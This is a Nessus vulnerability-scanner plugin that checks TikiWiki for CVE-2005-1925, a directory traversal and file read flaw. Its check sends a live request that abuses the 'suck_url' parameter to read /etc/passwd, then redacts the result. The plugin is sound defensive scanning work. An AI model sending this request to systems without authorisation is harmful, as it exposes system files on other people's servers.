#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(20185);
  script_version("1.24");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2005-1925");
  script_bugtraq_id(15390, 15392);

  script_name(english:"TikiWiki < 1.8.6 / 1.9.1 Multiple Vulnerabilities");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple vulnerabilities.");
  script_set_attribute(attribute:"description", value:
"The remote host is running TikiWiki, an open source wiki application
written in PHP.

The version of TikiWiki installed on the remote host fails to sanitize
input to the 'language' parameter of the 'tiki-user_preferences.php'
script before using it in a PHP 'include' function.  An authenticated
attacker can leverage this issue by specifying a path with directory
traversal sequences to read arbitrary files and possibly execute
arbitrary PHP code on the remote host, subject to the privileges of
the web server user id.

In addition, it also fails to sanitize input to the 'suck_url'
parameter of the 'tiki-editpage.php' script before using it to read
files.  With a specially crafted request, an unauthenticated attacker
can exploit this issues to read arbitrary files on the remote host.");
  # https://labs.idefense.com/verisign/intelligence/2009/vulnerabilities/display.php?id=335
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?80e4c43a");
  # https://labs.idefense.com/verisign/intelligence/2009/vulnerabilities/display.php?id=337
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?693945ce");
  script_set_attribute(attribute:"see_also", value:"http://sourceforge.net/project/shownotes.php?release_id=350764");
  script_set_attribute(attribute:"solution", value:
"Upgrade to TikiWiki 1.8.6 / 1.9.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"plugin_publication_date", value:"2005/11/14");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:tikiwiki:tikiwiki");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("tikiwiki_detect.nasl");
  script_require_keys("www/PHP", "www/tikiwiki");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("data_protection.inc");

port = get_http_port(default:80,php:TRUE);

install = get_install_from_kb(appname:'tikiwiki', port:port, exit_on_fail:TRUE);
dir = install['dir'];

# Try to exploit one of the flaws to read /etc/passwd.
w = http_send_recv3(method:"GET",
      item:string(
      dir, "/tiki-editpage.php?",
      "page=SandBox&",
      "do_suck=1&",
      "parsehtml=n&",
      "suck_url=/etc/passwd"
    ),
    port:port,
    exit_on_fail:TRUE
  );

res = w[2];

# If it looks like TikiWiki...
if ("This is Tiki" >< res)
{
  # There's a problem if there's an entry for root.
  if (egrep(pattern:"root:.*:0:[01]:", string:res))
  {
    if (report_verbosity > 0)
    {
      contents = strstr(res, "<textarea id='editwiki");
      if (contents)
      {
        contents = contents - strstr(contents, "</textarea>");
        contents = strstr(contents, ">");
        contents = contents - ">";
      }
      else contents = res;
      contents = data_protection::redact_etc_passwd(output:contents);
      report = string(
          "\n",
          contents
        );
        security_warning(port:port, extra:report);
    }
    else security_warning(port);

    exit(0);
  }
  # The exploit won't work if Tiki's Sandbox feature is disabled.
  else if (report_paranoia > 1)
  {
    if (egrep(pattern:"This is Tiki v(0\.|1\.([0-7]\.|8\.[0-5][^0-9]|9\.0[^0-9]))", string:res))
    {
      report = string(
        "\n",
        "Note that Nessus determined the vulnerabilities exist only\n",
        "by looking at the version number of TikiWiki installed on\n",
        "the remote host.\n"
      );
      security_warning(port:port, extra:report);
      exit(0);
    }
  }
}
